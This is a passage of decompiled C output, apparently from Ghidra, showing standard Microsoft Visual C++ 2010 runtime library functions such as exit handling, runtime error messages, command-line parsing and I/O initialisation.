    puVar1[uVar2 - 3] = *(undefined4 *)((int)_Src + (uVar2 - 3) * 4);
  case 8:
  case 9:
  case 10:
  case 0xb:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 2] = *(undefined4 *)((int)_Src + (uVar2 - 2) * 4);
  case 4:
  case 5:
  case 6:
  case 7:
    puVar1[uVar2 - 1] = *(undefined4 *)((int)_Src + (uVar2 - 1) * 4);
    _Src = (void *)((int)_Src + uVar2 * 4);
    puVar1 = puVar1 + uVar2;
  }
  switch(uVar3) {
  case 1:
switchD_00409ce9_caseD_1:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    return _Dst;
  case 2:
switchD_00409ce9_caseD_2:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)_Src + 1);
    return _Dst;
  case 3:
switchD_00409ce9_caseD_3:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)_Src + 1);
    *(undefined *)((int)puVar1 + 2) = *(undefined *)((int)_Src + 2);
    return _Dst;
  }
switchD_00409ce9_caseD_0:
  return _Dst;
}



// Library Function - Single Match
//  long __stdcall __CxxUnhandledExceptionFilter(struct _EXCEPTION_POINTERS *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

long __CxxUnhandledExceptionFilter(_EXCEPTION_POINTERS *param_1)

{
  PEXCEPTION_RECORD pEVar1;
  ULONG_PTR UVar2;
  
  pEVar1 = param_1->ExceptionRecord;
  if (((pEVar1->ExceptionCode == 0xe06d7363) && (pEVar1->NumberParameters == 3)) &&
     ((UVar2 = pEVar1->ExceptionInformation[0], UVar2 == 0x19930520 ||
      (((UVar2 == 0x19930521 || (UVar2 == 0x19930522)) || (UVar2 == 0x1994000)))))) {
    terminate();
  }
  return 0;
}



// Library Function - Single Match
//  ___crtCorExitProcess
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl ___crtCorExitProcess(int param_1)

{
  HMODULE hModule;
  FARPROC pFVar1;
  
  hModule = GetModuleHandleW(u_mscoree_dll_004122b8);
  if (hModule != (HMODULE)0x0) {
    pFVar1 = GetProcAddress(hModule,s_CorExitProcess_004122a8);
    if (pFVar1 != (FARPROC)0x0) {
      (*pFVar1)(param_1);
    }
  }
  return;
}



// Library Function - Single Match
//  ___crtExitProcess
// 
// Library: Visual Studio 2010 Release

void __cdecl ___crtExitProcess(int param_1)

{
  ___crtCorExitProcess(param_1);
                    // WARNING: Subroutine does not return
  ExitProcess(param_1);
}



void FUN_0040a084(void)

{
  __lock(8);
  return;
}



void FUN_0040a08d(void)

{
  FUN_0040da13(8);
  return;
}



// Library Function - Single Match
//  __init_pointers
// 
// Library: Visual Studio 2010 Release

void __cdecl __init_pointers(void)

{
  undefined4 uVar1;
  
  uVar1 = FUN_0040ac93();
  FUN_0040b1c2(uVar1);
  FUN_00407055(uVar1);
  FUN_0040f0cc(uVar1);
  FUN_0040f0bd(uVar1);
  __initp_misc_winsig(uVar1);
  FUN_0040eea7();
  return;
}



// Library Function - Single Match
//  __initterm_e
// 
// Library: Visual Studio 2010 Release

void __cdecl __initterm_e(undefined **param_1,undefined **param_2)

{
  int iVar1;
  
  iVar1 = 0;
  while ((param_1 < param_2 && (iVar1 == 0))) {
    if ((code *)*param_1 != (code *)0x0) {
      iVar1 = (*(code *)*param_1)();
    }
    param_1 = (code **)param_1 + 1;
  }
  return;
}



// Library Function - Single Match
//  __cinit
// 
// Library: Visual Studio 2010 Release

int __cdecl __cinit(int param_1)

{
  BOOL BVar1;
  int iVar2;
  code **ppcVar3;
  
  if ((DAT_00418fb0 != (code *)0x0) &&
     (BVar1 = __IsNonwritableInCurrentImage((PBYTE)&DAT_00418fb0), BVar1 != 0)) {
    (*DAT_00418fb0)(param_1);
  }
  __initp_misc_cfltcvt_tab();
  iVar2 = __initterm_e((undefined **)&DAT_004121f0,(undefined **)&DAT_00412208);
  if (iVar2 == 0) {
    _atexit((_func_4879 *)&LAB_0040ac6d);
    ppcVar3 = (code **)&DAT_004121e8;
    do {
      if (*ppcVar3 != (code *)0x0) {
        (**ppcVar3)();
      }
      ppcVar3 = ppcVar3 + 1;
    } while (ppcVar3 < &DAT_004121ec);
    if ((DAT_00418fb4 != (code *)0x0) &&
       (BVar1 = __IsNonwritableInCurrentImage((PBYTE)&DAT_00418fb4), BVar1 != 0)) {
      (*DAT_00418fb4)(0,2,0);
    }
    iVar2 = 0;
  }
  return iVar2;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// WARNING: Removing unreachable block (ram,0x0040a2b5)
// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  _doexit
// 
// Library: Visual Studio 2010 Release

void __cdecl _doexit(int param_1,int param_2,int param_3)

{
  PVOID *ppvVar1;
  PVOID *ppvVar2;
  PVOID pvVar3;
  code *pcVar4;
  PVOID *ppvVar5;
  PVOID *ppvVar6;
  PVOID *local_34;
  PVOID *local_2c;
  PVOID *local_28;
  code **local_24;
  code **local_20;
  
  __lock(8);
  if (DAT_004172bc != 1) {
    _DAT_004172b8 = 1;
    DAT_004172b4 = (undefined)param_3;
    if (param_2 == 0) {
      ppvVar1 = (PVOID *)DecodePointer(DAT_00418fa8);
      if (ppvVar1 != (PVOID *)0x0) {
        ppvVar2 = (PVOID *)DecodePointer(DAT_00418fa4);
        local_34 = ppvVar1;
        local_2c = ppvVar2;
        local_28 = ppvVar1;
        while (ppvVar2 = ppvVar2 + -1, ppvVar1 <= ppvVar2) {
          pvVar3 = (PVOID)FUN_0040ac93();
          if (*ppvVar2 != pvVar3) {
            if (ppvVar2 < ppvVar1) break;
            pcVar4 = (code *)DecodePointer(*ppvVar2);
            pvVar3 = (PVOID)FUN_0040ac93();
            *ppvVar2 = pvVar3;
            (*pcVar4)();
            ppvVar5 = (PVOID *)DecodePointer(DAT_00418fa8);
            ppvVar6 = (PVOID *)DecodePointer(DAT_00418fa4);
            if ((local_28 != ppvVar5) || (ppvVar1 = local_34, local_2c != ppvVar6)) {
              ppvVar1 = ppvVar5;
              ppvVar2 = ppvVar6;
              local_34 = ppvVar5;
              local_2c = ppvVar6;
              local_28 = ppvVar5;
            }
          }
        }
      }
      for (local_20 = (code **)&DAT_0041220c; local_20 < &DAT_00412218; local_20 = local_20 + 1) {
        if (*local_20 != (code *)0x0) {
          (**local_20)();
        }
      }
    }
    for (local_24 = (code **)&DAT_0041221c; local_24 < &DAT_00412220; local_24 = local_24 + 1) {
      if (*local_24 != (code *)0x0) {
        (**local_24)();
      }
    }
  }
  FUN_0040a2af();
  if (param_3 == 0) {
    DAT_004172bc = 1;
    FUN_0040da13(8);
    ___crtExitProcess(param_1);
    return;
  }
  return;
}



void FUN_0040a2af(void)

{
  int unaff_EBP;
  
  if (*(int *)(unaff_EBP + 0x10) != 0) {
    FUN_0040da13(8);
  }
  return;
}



// Library Function - Single Match
//  _exit
// 
// Library: Visual Studio 2010 Release

void __cdecl _exit(int _Code)

{
  _doexit(_Code,0,0);
  return;
}



// Library Function - Single Match
//  __exit
// 
// Library: Visual Studio 2010 Release

void __cdecl __exit(int param_1)

{
  _doexit(param_1,1,0);
  return;
}



// Library Function - Single Match
//  __cexit
// 
// Library: Visual Studio 2010 Release

void __cdecl __cexit(void)

{
  _doexit(0,0,1);
  return;
}



// Library Function - Single Match
//  __amsg_exit
// 
// Library: Visual Studio 2010 Release

void __cdecl __amsg_exit(int param_1)

{
  code *pcVar1;
  
  __FF_MSGBANNER();
  __NMSG_WRITE(param_1);
  __exit(0xff);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// Library Function - Single Match
//  __GET_RTERRMSG
// 
// Library: Visual Studio 2010 Release

wchar_t * __cdecl __GET_RTERRMSG(int param_1)

{
  uint uVar1;
  
  uVar1 = 0;
  do {
    if (param_1 == (&DAT_00412b50)[uVar1 * 2]) {
      return (wchar_t *)(&PTR_u_R6002___floating_point_support_n_00412b54)[uVar1 * 2];
    }
    uVar1 = uVar1 + 1;
  } while (uVar1 < 0x16);
  return (wchar_t *)0x0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __NMSG_WRITE
// 
// Library: Visual Studio 2010 Release

void __cdecl __NMSG_WRITE(int param_1)

{
  wchar_t *pwVar1;
  int iVar2;
  errno_t eVar3;
  DWORD DVar4;
  size_t sVar5;
  HANDLE hFile;
  uint uVar6;
  wchar_t **lpNumberOfBytesWritten;
  LPOVERLAPPED lpOverlapped;
  wchar_t *local_200;
  char local_1fc [500];
  uint local_8;
  
  local_8 = DAT_00416048 ^ (uint)&stack0xfffffffc;
  pwVar1 = __GET_RTERRMSG(param_1);
  local_200 = pwVar1;
  if (pwVar1 != (wchar_t *)0x0) {
    iVar2 = __set_error_mode(3);
    if ((iVar2 == 1) || ((iVar2 = __set_error_mode(3), iVar2 == 0 && (DAT_00416000 == 1)))) {
      hFile = GetStdHandle(0xfffffff4);
      if ((hFile != (HANDLE)0x0) && (hFile != (HANDLE)0xffffffff)) {
        uVar6 = 0;
        do {
          local_1fc[uVar6] = *(char *)(pwVar1 + uVar6);
          if (pwVar1[uVar6] == L'\0') break;
          uVar6 = uVar6 + 1;
        } while (uVar6 < 500);
        lpOverlapped = (LPOVERLAPPED)0x0;
        lpNumberOfBytesWritten = &local_200;
        local_1fc[499] = 0;
        sVar5 = _strlen(local_1fc);
        WriteFile(hFile,local_1fc,sVar5,(LPDWORD)lpNumberOfBytesWritten,lpOverlapped);
      }
    }
    else if (param_1 != 0xfc) {
      eVar3 = _wcscpy_s((wchar_t *)&DAT_004172c0,0x314,u_Runtime_Error__Program__00412c8c);
      if (eVar3 == 0) {
        _DAT_004174fa = 0;
        DVar4 = GetModuleFileNameW((HMODULE)0x0,(LPWSTR)&DAT_004172f2,0x104);
        if ((DVar4 != 0) ||
           (eVar3 = _wcscpy_s((wchar_t *)&DAT_004172f2,0x2fb,u_<program_name_unknown>_00412c5c),
           eVar3 == 0)) {
          sVar5 = _wcslen((wchar_t *)&DAT_004172f2);
          if (0x3c < sVar5 + 1) {
            sVar5 = _wcslen((wchar_t *)&DAT_004172f2);
            eVar3 = _wcsncpy_s((wchar_t *)(&DAT_0041727c + sVar5 * 2),
                               0x2fb - ((int)(sVar5 * 2 + -0x76) >> 1),(wchar_t *)&DAT_00412c54,3);
            if (eVar3 != 0) goto LAB_0040a417;
          }
          eVar3 = _wcscat_s((wchar_t *)&DAT_004172c0,0x314,(wchar_t *)&DAT_00412c4c);
          if ((eVar3 == 0) &&
             (eVar3 = _wcscat_s((wchar_t *)&DAT_004172c0,0x314,local_200), eVar3 == 0)) {
            ___crtMessageBoxW((LPCWSTR)&DAT_004172c0,u_AMicrosoft_Visual_C___Runtime_Li_00412bfe + 1
                              ,0x12010);
            goto LAB_0040a4f2;
          }
        }
      }
LAB_0040a417:
                    // WARNING: Subroutine does not return
      __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
  }
LAB_0040a4f2:
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// Library Function - Single Match
//  __FF_MSGBANNER
// 
// Library: Visual Studio 2010 Release

void __cdecl __FF_MSGBANNER(void)

{
  int iVar1;
  
  iVar1 = __set_error_mode(3);
  if (iVar1 != 1) {
    iVar1 = __set_error_mode(3);
    if (iVar1 != 0) {
      return;
    }
    if (DAT_00416000 != 1) {
      return;
    }
  }
  __NMSG_WRITE(0xfc);
  __NMSG_WRITE(0xff);
  return;
}



// Library Function - Single Match
//  __XcptFilter
// 
// Library: Visual Studio 2010 Release

int __cdecl __XcptFilter(ulong _ExceptionNum,_EXCEPTION_POINTERS *_ExceptionPtr)

{
  ulong *puVar1;
  code *pcVar2;
  void *pvVar3;
  ulong uVar4;
  _ptiddata p_Var5;
  ulong *puVar6;
  int iVar7;
  
  p_Var5 = __getptd_noexit();
  if (p_Var5 != (_ptiddata)0x0) {
    puVar1 = (ulong *)p_Var5->_pxcptacttab;
    puVar6 = puVar1;
    do {
      if (*puVar6 == _ExceptionNum) break;
      puVar6 = puVar6 + 3;
    } while (puVar6 < puVar1 + 0x24);
    if ((puVar1 + 0x24 <= puVar6) || (*puVar6 != _ExceptionNum)) {
      puVar6 = (ulong *)0x0;
    }
    if ((puVar6 == (ulong *)0x0) || (pcVar2 = (code *)puVar6[2], pcVar2 == (code *)0x0)) {
      p_Var5 = (_ptiddata)0x0;
    }
    else if (pcVar2 == (code *)0x5) {
      puVar6[2] = 0;
      p_Var5 = (_ptiddata)0x1;
    }
    else {
      if (pcVar2 != (code *)0x1) {
        pvVar3 = p_Var5->_tpxcptinfoptrs;
        p_Var5->_tpxcptinfoptrs = _ExceptionPtr;
        if (puVar6[1] == 8) {
          iVar7 = 0x24;
          do {
            *(undefined4 *)(iVar7 + 8 + (int)p_Var5->_pxcptacttab) = 0;
            iVar7 = iVar7 + 0xc;
          } while (iVar7 < 0x90);
          uVar4 = *puVar6;
          iVar7 = p_Var5->_tfpecode;
          if (uVar4 == 0xc000008e) {
            p_Var5->_tfpecode = 0x83;
          }
          else if (uVar4 == 0xc0000090) {
            p_Var5->_tfpecode = 0x81;
          }
          else if (uVar4 == 0xc0000091) {
            p_Var5->_tfpecode = 0x84;
          }
          else if (uVar4 == 0xc0000093) {
            p_Var5->_tfpecode = 0x85;
          }
          else if (uVar4 == 0xc000008d) {
            p_Var5->_tfpecode = 0x82;
          }
          else if (uVar4 == 0xc000008f) {
            p_Var5->_tfpecode = 0x86;
          }
          else if (uVar4 == 0xc0000092) {
            p_Var5->_tfpecode = 0x8a;
          }
          else if (uVar4 == 0xc00002b5) {
            p_Var5->_tfpecode = 0x8d;
          }
          else if (uVar4 == 0xc00002b4) {
            p_Var5->_tfpecode = 0x8e;
          }
          (*pcVar2)(8,p_Var5->_tfpecode);
          p_Var5->_tfpecode = iVar7;
        }
        else {
          puVar6[2] = 0;
          (*pcVar2)(puVar6[1]);
        }
        p_Var5->_tpxcptinfoptrs = pvVar3;
      }
      p_Var5 = (_ptiddata)0xffffffff;
    }
  }
  return (int)p_Var5;
}



// Library Function - Single Match
//  __wwincmdln
// 
// Library: Visual Studio 2010 Release

void __wwincmdln(void)

{
  ushort uVar1;
  bool bVar2;
  ushort *puVar3;
  
  bVar2 = false;
  puVar3 = DAT_00419fc4;
  if (DAT_00419fc4 == (ushort *)0x0) {
    puVar3 = &DAT_00412d60;
  }
  do {
    uVar1 = *puVar3;
    if (uVar1 < 0x21) {
      if (uVar1 == 0) {
        return;
      }
      if (!bVar2) {
        for (; (*puVar3 != 0 && (*puVar3 < 0x21)); puVar3 = puVar3 + 1) {
        }
        return;
      }
    }
    if (uVar1 == 0x22) {
      bVar2 = !bVar2;
    }
    puVar3 = puVar3 + 1;
  } while( true );
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __wsetenvp
// 
// Library: Visual Studio 2010 Release

int __cdecl __wsetenvp(void)

{
  wchar_t **ppwVar1;
  size_t sVar2;
  wchar_t *_Dst;
  errno_t eVar3;
  wchar_t *pwVar4;
  int iVar5;
  
  iVar5 = 0;
  pwVar4 = DAT_00416f44;
  if (DAT_00416f44 == (wchar_t *)0x0) {
    iVar5 = -1;
  }
  else {
    for (; *pwVar4 != L'\0'; pwVar4 = pwVar4 + sVar2 + 1) {
      if (*pwVar4 != L'=') {
        iVar5 = iVar5 + 1;
      }
      sVar2 = _wcslen(pwVar4);
    }
    ppwVar1 = (wchar_t **)__calloc_crt(iVar5 + 1,4);
    pwVar4 = DAT_00416f44;
    DAT_004172a4 = ppwVar1;
    if (ppwVar1 == (wchar_t **)0x0) {
      iVar5 = -1;
    }
    else {
      for (; *pwVar4 != L'\0'; pwVar4 = pwVar4 + sVar2) {
        sVar2 = _wcslen(pwVar4);
        sVar2 = sVar2 + 1;
        if (*pwVar4 != L'=') {
          _Dst = (wchar_t *)__calloc_crt(sVar2,2);
          *ppwVar1 = _Dst;
          if (_Dst == (wchar_t *)0x0) {
            _free(DAT_004172a4);
            DAT_004172a4 = (wchar_t **)0x0;
            return -1;
          }
          eVar3 = _wcscpy_s(_Dst,sVar2,pwVar4);
          if (eVar3 != 0) {
                    // WARNING: Subroutine does not return
            __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
          }
          ppwVar1 = ppwVar1 + 1;
        }
      }
      _free(DAT_00416f44);
      DAT_00416f44 = (wchar_t *)0x0;
      *ppwVar1 = (wchar_t *)0x0;
      _DAT_00418fa0 = 1;
      iVar5 = 0;
    }
  }
  return iVar5;
}



// Library Function - Single Match
//  _wparse_cmdline
// 
// Library: Visual Studio 2010 Release

void __thiscall _wparse_cmdline(void *this,short **param_1,int *param_2)

{
  bool bVar1;
  bool bVar2;
  short *in_EAX;
  short sVar3;
  uint uVar4;
  int *unaff_EBX;
  
  bVar1 = false;
  *unaff_EBX = 0;
  *param_2 = 1;
  if (param_1 != (short **)0x0) {
    *param_1 = (short *)this;
    param_1 = param_1 + 1;
  }
  do {
    if (*in_EAX == 0x22) {
      bVar1 = !bVar1;
      sVar3 = 0x22;
    }
    else {
      *unaff_EBX = *unaff_EBX + 1;
      if ((short *)this != (short *)0x0) {
        *(short *)this = *in_EAX;
        this = (void *)((int)this + 2);
      }
      sVar3 = *in_EAX;
      if (sVar3 == 0) goto LAB_0040a819;
    }
    in_EAX = in_EAX + 1;
  } while ((bVar1) || ((sVar3 != 0x20 && (sVar3 != 9))));
  if ((short *)this != (short *)0x0) {
    *(short *)((int)this + -2) = 0;
  }
LAB_0040a819:
  bVar1 = false;
  while (*in_EAX != 0) {
    for (; (*in_EAX == 0x20 || (*in_EAX == 9)); in_EAX = in_EAX + 1) {
    }
    if (*in_EAX == 0) break;
    if (param_1 != (short **)0x0) {
      *param_1 = (short *)this;
      param_1 = param_1 + 1;
    }
    *param_2 = *param_2 + 1;
    while( true ) {
      bVar2 = true;
      uVar4 = 0;
      for (; *in_EAX == 0x5c; in_EAX = in_EAX + 1) {
        uVar4 = uVar4 + 1;
      }
      if (*in_EAX == 0x22) {
        if ((uVar4 & 1) == 0) {
          if ((bVar1) && (in_EAX[1] == 0x22)) {
            in_EAX = in_EAX + 1;
          }
          else {
            bVar2 = false;
            bVar1 = !bVar1;
          }
        }
        uVar4 = uVar4 >> 1;
      }
      while (uVar4 != 0) {
        uVar4 = uVar4 - 1;
        if ((short *)this != (short *)0x0) {
          *(short *)this = 0x5c;
          this = (void *)((int)this + 2);
        }
        *unaff_EBX = *unaff_EBX + 1;
      }
      sVar3 = *in_EAX;
      if ((sVar3 == 0) || ((!bVar1 && ((sVar3 == 0x20 || (sVar3 == 9)))))) break;
      if (bVar2) {
        if ((short *)this != (short *)0x0) {
          *(short *)this = sVar3;
          this = (void *)((int)this + 2);
        }
        *unaff_EBX = *unaff_EBX + 1;
      }
      in_EAX = in_EAX + 1;
    }
    if ((short *)this != (short *)0x0) {
      *(short *)this = 0;
      this = (void *)((int)this + 2);
    }
    *unaff_EBX = *unaff_EBX + 1;
  }
  if (param_1 != (short **)0x0) {
    *param_1 = (short *)0x0;
  }
  *param_2 = *param_2 + 1;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __wsetargv
// 
// Library: Visual Studio 2010 Release

int __cdecl __wsetargv(void)

{
  uint _Size;
  uint uVar1;
  short **ppsVar2;
  int iVar3;
  uint in_ECX;
  uint local_8;
  
  _DAT_00417af0 = 0;
  local_8 = in_ECX;
  GetModuleFileNameW((HMODULE)0x0,(LPWSTR)&DAT_004178e8,0x104);
  _DAT_004172b0 = &DAT_004178e8;
  _wparse_cmdline((void *)0x0,(short **)0x0,(int *)&local_8);
  uVar1 = local_8;
  if ((((local_8 < 0x3fffffff) && (in_ECX < 0x7fffffff)) &&
      (_Size = (in_ECX + local_8 * 2) * 2, in_ECX * 2 <= _Size)) &&
     (ppsVar2 = (short **)__malloc_crt(_Size), ppsVar2 != (short **)0x0)) {
    _wparse_cmdline(ppsVar2 + uVar1,ppsVar2,(int *)&local_8);
    _DAT_00417290 = local_8 - 1;
    iVar3 = 0;
    _DAT_00417298 = ppsVar2;
  }
  else {
    iVar3 = -1;
  }
  return iVar3;
}



// Library Function - Single Match
//  ___crtGetEnvironmentStringsW
// 
// Library: Visual Studio 2010 Release

LPVOID __cdecl ___crtGetEnvironmentStringsW(void)

{
  size_t _Size;
  WCHAR WVar1;
  LPWCH _Src;
  WCHAR *pWVar2;
  void *_Dst;
  WCHAR *pWVar3;
  
  _Src = GetEnvironmentStringsW();
  if (_Src != (LPWCH)0x0) {
    WVar1 = *_Src;
    pWVar2 = _Src;
    while (WVar1 != L'\0') {
      do {
        pWVar3 = pWVar2;
        pWVar2 = pWVar3 + 1;
      } while (*pWVar2 != L'\0');
      pWVar2 = pWVar3 + 2;
      WVar1 = *pWVar2;
    }
    _Size = (int)pWVar2 + (2 - (int)_Src);
    _Dst = __malloc_crt(_Size);
    if (_Dst != (void *)0x0) {
      FID_conflict__memcpy(_Dst,_Src,_Size);
    }
    FreeEnvironmentStringsW(_Src);
    return _Dst;
  }
  return (LPVOID)0x0;
}



// Library Function - Single Match
//  __ioinit
// 
// Library: Visual Studio 2010 Release

int __cdecl __ioinit(void)

{
  void *pvVar1;
  int iVar2;
  DWORD DVar3;
  BOOL BVar4;
  HANDLE pvVar5;
  UINT UVar6;
  UINT UVar7;
  HANDLE *ppvVar8;
  void **ppvVar9;
  uint uVar10;
  _STARTUPINFOW local_50;
  HANDLE *local_c;
  UINT *local_8;
  
  GetStartupInfoW(&local_50);
  pvVar1 = __calloc_crt(0x20,0x40);
  if (pvVar1 == (void *)0x0) {
    iVar2 = -1;
  }
  else {
    DAT_00418e90 = 0x20;
    DAT_00418ea0 = pvVar1;
    if (pvVar1 < (void *)((int)pvVar1 + 0x800U)) {
      iVar2 = (int)pvVar1 + 5;
      do {
        *(undefined4 *)(iVar2 + -5) = 0xffffffff;
        *(undefined2 *)(iVar2 + -1) = 0xa00;
        *(undefined4 *)(iVar2 + 3) = 0;
        *(undefined2 *)(iVar2 + 0x1f) = 0xa00;
        *(undefined *)(iVar2 + 0x21) = 10;
        *(undefined4 *)(iVar2 + 0x33) = 0;
        *(undefined *)(iVar2 + 0x2f) = 0;
        uVar10 = iVar2 + 0x3b;
        iVar2 = iVar2 + 0x40;
      } while (uVar10 < (int)DAT_00418ea0 + 0x800U);
    }
    if ((local_50.cbReserved2 != 0) && ((UINT *)local_50.lpReserved2 != (UINT *)0x0)) {
      UVar6 = *(UINT *)local_50.lpReserved2;
      local_8 = (UINT *)((int)local_50.lpReserved2 + 4);
      local_c = (HANDLE *)((int)local_8 + UVar6);
      if (0x7ff < (int)UVar6) {
        UVar6 = 0x800;
      }
      UVar7 = UVar6;
      if ((int)DAT_00418e90 < (int)UVar6) {
        ppvVar9 = (void **)&DAT_00418ea4;
        do {
          pvVar1 = __calloc_crt(0x20,0x40);
          UVar7 = DAT_00418e90;
          if (pvVar1 == (void *)0x0) break;
          DAT_00418e90 = DAT_00418e90 + 0x20;
          *ppvVar9 = pvVar1;
          if (pvVar1 < (void *)((int)pvVar1 + 0x800U)) {
            iVar2 = (int)pvVar1 + 5;
            do {
              *(undefined4 *)(iVar2 + -5) = 0xffffffff;
              *(undefined4 *)(iVar2 + 3) = 0;
              *(byte *)(iVar2 + 0x1f) = *(byte *)(iVar2 + 0x1f) & 0x80;
              *(undefined4 *)(iVar2 + 0x33) = 0;
              *(undefined2 *)(iVar2 + -1) = 0xa00;
              *(undefined2 *)(iVar2 + 0x20) = 0xa0a;
              *(undefined *)(iVar2 + 0x2f) = 0;
              uVar10 = iVar2 + 0x3b;
              iVar2 = iVar2 + 0x40;
            } while (uVar10 < (int)*ppvVar9 + 0x800U);
          }
          ppvVar9 = ppvVar9 + 1;
          UVar7 = UVar6;
        } while ((int)DAT_00418e90 < (int)UVar6);
      }
      uVar10 = 0;
      if (0 < (int)UVar7) {
        do {
          pvVar5 = *local_c;
          if ((((pvVar5 != (HANDLE)0xffffffff) && (pvVar5 != (HANDLE)0xfffffffe)) &&
              ((*(byte *)local_8 & 1) != 0)) &&
             (((*(byte *)local_8 & 8) != 0 || (DVar3 = GetFileType(pvVar5), DVar3 != 0)))) {
            ppvVar8 = (HANDLE *)((uVar10 & 0x1f) * 0x40 + (int)(&DAT_00418ea0)[(int)uVar10 >> 5]);
            *ppvVar8 = *local_c;
            *(byte *)(ppvVar8 + 1) = *(byte *)local_8;
            BVar4 = InitializeCriticalSectionAndSpinCount((LPCRITICAL_SECTION)(ppvVar8 + 3),4000);
            if (BVar4 == 0) {
              return -1;
            }
            ppvVar8[2] = (HANDLE)((int)ppvVar8[2] + 1);
          }
          local_c = local_c + 1;
          uVar10 = uVar10 + 1;
          local_8 = (UINT *)((int)local_8 + 1);
        } while ((int)uVar10 < (int)UVar7);
      }
    }
    iVar2 = 0;
    do {
      ppvVar8 = (HANDLE *)(iVar2 * 0x40 + (int)DAT_00418ea0);
      if ((*ppvVar8 == (HANDLE)0xffffffff) || (*ppvVar8 == (HANDLE)0xfffffffe)) {
        *(undefined *)(ppvVar8 + 1) = 0x81;
        if (iVar2 == 0) {
          DVar3 = 0xfffffff6;
        }
        else {
          DVar3 = 0xfffffff5 - (iVar2 != 1);
        }
        pvVar5 = GetStdHandle(DVar3);
        if (((pvVar5 == (HANDLE)0xffffffff) || (pvVar5 == (HANDLE)0x0)) ||
           (DVar3 = GetFileType(pvVar5), DVar3 == 0)) {
          *(byte *)(ppvVar8 + 1) = *(byte *)(ppvVar8 + 1) | 0x40;
          *ppvVar8 = (HANDLE)0xfffffffe;
        }
        else {
          *ppvVar8 = pvVar5;
          if ((DVar3 & 0xff) == 2) {
            *(byte *)(ppvVar8 + 1) = *(byte *)(ppvVar8 + 1) | 0x40;
          }
          else if ((DVar3 & 0xff) == 3) {
            *(byte *)(ppvVar8 + 1) = *(byte *)(ppvVar8 + 1) | 8;
          }
          BVar4 = InitializeCriticalSectionAndSpinCount((LPCRITICAL_SECTION)(ppvVar8 + 3),4000);
          if (BVar4 == 0) {
            return -1;
          }
          ppvVar8[2] = (HANDLE)((int)ppvVar8[2] + 1);
        }
      }
      else {
        *(byte *)(ppvVar8 + 1) = *(byte *)(ppvVar8 + 1) | 0x80;
      }
      iVar2 = iVar2 + 1;
    } while (iVar2 < 3);
    SetHandleCount(DAT_00418e90);
    iVar2 = 0;
  }
  return iVar2;
}



// WARNING: Removing unreachable block (ram,0x0040ac5b)
// WARNING: Removing unreachable block (ram,0x0040ac61)
// WARNING: Removing unreachable block (ram,0x0040ac63)
// Library Function - Single Match
//  __RTC_Initialize
// 
// Library: Visual Studio 2010 Release

void __RTC_Initialize(void)

{
  return;
}



void FUN_0040ac93(void)

{
  EncodePointer((PVOID)0x0);
  return;
}



// Library Function - Single Match
//  ___set_flsgetvalue
// 
// Library: Visual Studio 2010 Release

LPVOID ___set_flsgetvalue(void)

{
  LPVOID lpTlsValue;
  
  lpTlsValue = TlsGetValue(DAT_00416584);
  if (lpTlsValue == (LPVOID)0x0) {
    lpTlsValue = DecodePointer(DAT_00417af8);
    TlsSetValue(DAT_00416584,lpTlsValue);
  }
  return lpTlsValue;
}



// Library Function - Single Match
//  __mtterm
// 
// Library: Visual Studio 2010 Release

void __cdecl __mtterm(void)

{
  code *pcVar1;
  int iVar2;
  
  if (DAT_00416580 != -1) {
    iVar2 = DAT_00416580;
    pcVar1 = (code *)DecodePointer(DAT_00417b00);
    (*pcVar1)(iVar2);
    DAT_00416580 = -1;
  }
  if (DAT_00416584 != 0xffffffff) {
    TlsFree(DAT_00416584);
    DAT_00416584 = 0xffffffff;
  }
  __mtdeletelocks();
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __initptd
// 
// Library: Visual Studio 2010 Release

void __cdecl __initptd(_ptiddata _Ptd,pthreadlocinfo _Locale)

{
  GetModuleHandleW(u_KERNEL32_DLL_00412d64);
  _Ptd->_pxcptacttab = &DAT_00412cc0;
  _Ptd->_terrno = 0;
  _Ptd->_holdrand = 1;
  _Ptd->_ownlocale = 1;
  *(undefined *)((_Ptd->_setloc_data)._cachein + 8) = 0x43;
  *(undefined *)((int)(_Ptd->_setloc_data)._cachein + 0x93) = 0x43;
  _Ptd->ptmbcinfo = (pthreadmbcinfo)&DAT_004165a0;
  __lock(0xd);
  InterlockedIncrement(&_Ptd->ptmbcinfo->refcount);
  FUN_0040adb8();
  __lock(0xc);
  _Ptd->ptlocinfo = _Locale;
  if (_Locale == (pthreadlocinfo)0x0) {
    _Ptd->ptlocinfo = (pthreadlocinfo)PTR_DAT_00416d08;
  }
  ___addlocaleref(&_Ptd->ptlocinfo->refcount);
  FUN_0040adc1();
  return;
}



void FUN_0040adb8(void)

{
  FUN_0040da13(0xd);
  return;
}



void FUN_0040adc1(void)

{
  FUN_0040da13(0xc);
  return;
}



// Library Function - Single Match
//  __getptd_noexit
// 
// Library: Visual Studio 2010 Release

_ptiddata __cdecl __getptd_noexit(void)

{
  DWORD dwErrCode;
  code *pcVar1;
  _ptiddata _Ptd;
  int iVar2;
  DWORD DVar3;
  undefined4 uVar4;
  _ptiddata p_Var5;
  
  dwErrCode = GetLastError();
  uVar4 = DAT_00416580;
  pcVar1 = (code *)___set_flsgetvalue();
